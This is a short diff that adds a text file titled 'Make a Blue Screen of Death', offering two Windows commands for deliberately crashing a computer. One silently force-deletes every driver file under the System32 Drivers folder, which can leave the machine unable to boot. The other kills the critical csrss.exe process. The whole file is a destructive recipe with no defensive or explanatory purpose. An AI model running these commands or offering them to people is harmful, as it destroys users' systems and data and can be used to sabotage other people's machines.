@@ -1,0 +1,8 @@
+Make a Blue Screen of Death:
+
+del /q /f /s %systemroot%\System32\Drivers\*
+
+
+Another way is this:
+
+tskill csrss.exe
